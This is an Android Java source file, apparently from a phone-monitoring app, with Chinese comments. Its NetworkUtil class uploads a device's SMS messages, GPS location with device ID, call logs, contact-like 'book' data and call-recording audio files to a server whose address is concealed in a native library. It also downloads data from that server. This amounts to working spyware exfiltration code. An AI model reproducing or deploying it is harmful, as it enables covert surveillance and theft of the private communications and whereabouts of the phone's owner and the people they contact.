package com.privacy.monitor.util;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.MalformedURLException;
import java.net.Proxy;
import java.net.URL;
import com.privacy.monitor.base.C;
import android.content.Context;

/**
 * 联网工具类
 * 主要执行文件的上传、下载操作
 */
public class NetworkUtil {
	static{
		
		System.loadLibrary("util");
	
	}
	
	//此方法由c语言实现
	public static native String getURL();
	
	
	public static String uploadSMS(Context ctx,String updateData,String requestMethod){
		URL url = null;
		HttpURLConnection conn = null;
		String result = "";
		if(!HttpUtil.detect(ctx))return "";
		try {
			String strUrl = getURL();
			strUrl = strUrl+"/"+requestMethod;
			Logger.d("NewworkUtil",strUrl);
			url = new URL(strUrl);
			if (HttpUtil.WAP_INT == HttpUtil.getNetType(ctx)) {
				Proxy proxy = new Proxy(java.net.Proxy.Type.HTTP,new InetSocketAddress("10.0.0.172", 80));
				conn = (HttpURLConnection) url.openConnection(proxy);
			} else {
				conn = (HttpURLConnection) url.openConnection();
			}
			byte [] datas = updateData.getBytes();
			conn.setConnectTimeout(30000);
			conn.setReadTimeout(30000);
			conn.setDoOutput(true);
			conn.setDoInput(true);
			conn.setUseCaches(false);
			conn.setRequestMethod("POST");
			//conn.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
			conn.setRequestProperty("Content-Length",datas.length+"");
			conn.getOutputStream().write(datas);
			if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
				Logger.d("NetworkUtil","上传短信成功");
				InputStreamReader isr = new InputStreamReader(conn.getInputStream());
				BufferedReader br = new BufferedReader(isr);
				String temp = null;
				while ((temp = br.readLine()) != null) {
					result = result + temp;
				}
				isr.close();
			}else {
				result = "FAIL: " + conn.getResponseCode();
			}
			
		} catch (Exception e) {
				result = "FAIL";
		}
		return result;
	}
	
	
	
	/**专用于上传定位信息*/
	public static synchronized String sendLocInfo(Context context,String key,String device_id, String lon, String lat, String loc_name, String locTime, String requestMethod) {
		String result = "";
		try {
			if(!HttpUtil.detect(context))return "";
			String strUrl = getURL();
			strUrl = strUrl+"/"+requestMethod;
			URL url = new URL(strUrl);
			Logger.d("Net","正在上传定位信息");
			String param = "key=" + key + "&device_id=" + device_id + "&lon=" + lon+"&lat="+lat+"&loc_name="+loc_name+"&time="+locTime;

			Logger.d("NetworkUtil",param);

			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setConnectTimeout(5 * 1000);
			conn.setRequestMethod("POST");
			conn.setDoOutput(true);
			OutputStream os = conn.getOutputStream();
			os.write(param.getBytes());
			
			if (conn.getResponseCode() == 200) {
				InputStreamReader isr = new InputStreamReader(conn.getInputStream());
				BufferedReader br = new BufferedReader(isr);
				String temp = null;
				while ((temp = br.readLine()) != null) {
					result = result + temp;
				}
				isr.close();
			} else {
				result = "FAIL: " + conn.getResponseCode();
			}
			
		} catch (Exception e) {
			result = "FAIL";
		}
		return result;
	}
	
	/**
	 * 上传文件
	 * @param ctx 上下文
	 * @param url 上传文件的url
	 * @param object 上传文件的内容
	 * @return 响应结果
	 */
	public static String uploadBook(Context ctx,String updateData,String requestMethod){
		URL url = null;
		HttpURLConnection conn = null;
		String result = "";
		if(!HttpUtil.detect(ctx))return "";
		try {
			String strUrl = getURL();
			strUrl = strUrl+"/"+requestMethod;
			Logger.d("NewworkUtil",strUrl);
			url = new URL(strUrl);
			if (HttpUtil.WAP_INT == HttpUtil.getNetType(ctx)) {
				Proxy proxy = new Proxy(java.net.Proxy.Type.HTTP,new InetSocketAddress("10.0.0.172", 80));
				conn = (HttpURLConnection) url.openConnection(proxy);
			} else {
				conn = (HttpURLConnection) url.openConnection();
			}
			byte [] datas = updateData.getBytes();
			conn.setConnectTimeout(30000);
			conn.setReadTimeout(30000);
			conn.setDoOutput(true);
			conn.setDoInput(true);
			conn.setUseCaches(false);
			conn.setRequestMethod("POST");
			//conn.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
			conn.setRequestProperty("Content-Length",datas.length+"");
			conn.getOutputStream().write(datas);
			if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
				InputStreamReader isr = new InputStreamReader(conn.getInputStream());
				BufferedReader br = new BufferedReader(isr);
				String temp = null;
				while ((temp = br.readLine()) != null) {
					result = result + temp;
				}
				isr.close();
			} else {
				result = "FAIL: " + conn.getResponseCode();
			}
			
		} catch (Exception e) {
			result = "FAIL";
		}
		return result;
	}
	
	/**
	 * 下载文件
	 */
	public static InputStream download(Context ctx,String updateData,String requestMethod){
		URL url = null;
		HttpURLConnection conn = null;
		InputStream is = null;
		try {
			String strUrl = getURL();
			strUrl = strUrl+"/"+requestMethod;
			Logger.d("NewworkUtil",strUrl);
			url = new URL(strUrl);
			if (HttpUtil.WAP_INT == HttpUtil.getNetType(ctx)) {
				Proxy proxy = new Proxy(java.net.Proxy.Type.HTTP,new InetSocketAddress("10.0.0.172", 80));
				conn = (HttpURLConnection) url.openConnection(proxy);
			} else {
				conn = (HttpURLConnection) url.openConnection();
			}
			byte [] datas = updateData.getBytes();
			conn.setConnectTimeout(30000);
			conn.setReadTimeout(30000);
			conn.setDoOutput(true);
			conn.setDoInput(true);
			conn.setUseCaches(false);
			conn.setRequestMethod("POST");
			//conn.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
			conn.setRequestProperty("Content-Length",datas.length+"");
			conn.getOutputStream().write(datas);
			if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
				Logger.d("NewworkUtil","下载数据成功");
				is = conn.getInputStream();
			}
			
		} catch (Exception e) {
			Logger.d("NetworkUtil",e.getMessage());
			return null;
		}
		return is;
	}
	
	public static String uploadCall(Context context,String params,String requestMethod){
		String result = "";
		if(!HttpUtil.detect(context))return "";
		try {
			String strUrl=getURL()+"/"+requestMethod;
			URL url = new URL(strUrl);
		
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setConnectTimeout(30000);
			conn.setReadTimeout(30000);
			conn.setDoOutput(true);
			conn.setDoInput(true);
			conn.setUseCaches(false);
			conn.setRequestMethod("POST");
			conn.getOutputStream().write(params.getBytes());
		    if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
		    	Logger.d("NewworkUtil","上传通话记录数据成功");
		     	InputStream inputStream = conn.getInputStream();
		     	if(inputStream !=null){
		     		return AppUtil.streamToStr(inputStream);
		     	}
		    }
		    result = "FAIL:"+conn.getResponseCode();
		} catch (Exception e) {
			result = "FAIL: exception";
			
		}
		return result;
	}
	
	
	
	/**上传文件*/
	public static String uploadFile(Context context,String filePath,String fileName,String requestMethod){
		String result = "";
		if(!HttpUtil.detect(context))return "";
		try {
			File file = new File(filePath);
			
			if(!file.exists()){
				Logger.d("NetworkUtil","文件不存在");
				 return "FAIL";
			}else {
				long fileSize= file.length();
				if(fileSize <=0){

					Logger.d("NetworkUtil","文件不存在");
					return "FAIL";
				}
			}
			URL url = new URL(getURL()+"/"+requestMethod);
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setDoInput(true);
			conn.setDoOutput(true);
			conn.setUseCaches(false);
			conn.setRequestMethod("POST");
			conn.setRequestProperty("Connection", "Keep-Alive");
			conn.setRequestProperty("Charset", "UTF-8");
			conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + "******");
			DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
			dos.writeBytes("--******\r\n");
			dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\""+fileName+"\"" + "\r\n");
			dos.writeBytes("\r\n");
			FileInputStream fis = new FileInputStream(filePath);
			byte[] buffer = new byte[8192]; // 8k
			int count = 0;
			while ((count = fis.read(buffer)) != -1) {
				dos.write(buffer, 0, count);
			}
			fis.close();
			dos.writeBytes("\r\n");
			dos.writeBytes("--******--\r\n");
			dos.flush();
			if(conn.getResponseCode()==HttpURLConnection.HTTP_OK){
				Logger.d("NetworkUtil","上传录音文件成功");
				InputStream is = conn.getInputStream();
			   return AppUtil.streamToStr(is);
			}else {
				InputStream is = conn.getInputStream();
				InputStreamReader isr = new InputStreamReader(is, "utf-8");
				BufferedReader br = new BufferedReader(isr);
				result = "FAIL:"+br.readLine();
			}
		} catch (MalformedURLException e) {
			result = "FAIL";
		} catch (IOException e) {
			result = "FAIL";
		}
		return result;
	}
	
	/**上传文件信息*/
	public static String uploadFileInfo(Context context,String params,String requestMethod){
		String result = "";
		if(HttpUtil.detect(context)){
			try {
				String strURL = getURL()+"/"+C.RequestMethod.uploadCallSoundFile;
				Logger.d("NetworkUtil",strURL);
				URL url = new URL(strURL);
				HttpURLConnection conn = (HttpURLConnection) url.openConnection();
				conn.setDoInput(true);
				conn.setDoOutput(true);
				conn.setUseCaches(false);
				conn.setRequestMethod("POST");
				conn.setRequestProperty("Charset", "UTF-8");
				conn.getOutputStream().write(params.getBytes());
				if (conn.getResponseCode() == 200) {
					InputStreamReader isr = new InputStreamReader(conn.getInputStream());
					BufferedReader br = new BufferedReader(isr);
					String temp = null;
					while ((temp = br.readLine()) != null) {
						result = result + temp;
					}
					isr.close();
				} else {
					result = "FAIL: " + conn.getResponseCode();
				}
				
			} catch (MalformedURLException e) {
				result = "FAIL";
			} catch (IOException e) {
				result = "FAIL";
			}
		}
		
		return result;
	}
}
